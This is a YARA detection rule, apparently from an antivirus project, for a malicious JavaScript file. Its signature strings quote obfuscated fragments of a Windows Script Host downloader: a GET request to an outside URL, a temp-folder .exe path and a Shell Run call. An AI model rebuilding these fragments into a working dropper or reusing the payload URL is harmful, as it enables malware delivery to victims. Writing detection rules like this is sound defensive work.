rule sig_20160328_58d51a8726e90dec40215cb9792e337e {
  meta:
    description = "datamaliciousorder - file 20160328_58d51a8726e90dec40215cb9792e337e.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "1b39ec58e4d8903aeb3dbd16a9ca27ce2e032997de5cee6944fe94363a9ef631"

  strings:
    $s1  = "function Gghlczdcyt() {return Ifjeu[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"AxY4LpX2o.exe\";};" fullword ascii
    $s2  = "do {WScript[Rwlvkkfwz](Qonnfc() * 11)} while (Ksorcw[\"readystate\"] < 4 );" fullword ascii
    $s3  = "var Ifjeu = function Leckhoaf() {return WScript[Bgnsqiw](\"WScript.Shell\");}();" fullword ascii
    $s4  = "Ksorcw[Ktoyqq](\"GET\", \"http://www.creative-drumschool.de/p3isakd\", false);" fullword ascii
    $s5  = "function Wumjtrrv(Svecyw, Smahk){return Svecyw - Smahk;};" fullword ascii
    $s6  = "function Fcsvh() {return ((Ygpku == true) && (Ygpku == Xccqtvky)) ? 1 : Psfrkqxkl;};" fullword ascii
    $s7  = "function Kffad(Csqbalyjct){Ifjeu[\"Run\"](Csqbalyjct, Psfrkqxkl, Psfrkqxkl);};" fullword ascii
    $s8  = "var Itseiv = false;" fullword ascii
    $s9  = "var Mjwnhawq = new this[\"Date\"]();" fullword ascii
    $s10 = "function Nccxruzkk(){return Pgvsoy;};" fullword ascii
    $s11 = "function Qonnfc(){return 22;};" fullword ascii
    $s12 = "function Svxqaal(){return Bgnsqiw;};" fullword ascii
    $s13 = "var Xccqtvky = false;" fullword ascii
    $s14 = "var Ygpku = false;" fullword ascii
    $s15 = "Ygpku = true; " fullword ascii
    $s16 = "return Wumjtrrv(Ydstqxlb, Tahbnu);" fullword ascii
    $s17 = "Xccqtvky = true; " fullword ascii
    $s18 = "function Wituine(Zdffwer) {var Qdhkktt = (1, 2, 3, 4, 5, Zdffwer); return Qdhkktt;};" fullword ascii
    $s19 = " while (Pwshpu){" fullword ascii
    $s20 = "function Fmcatmu()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}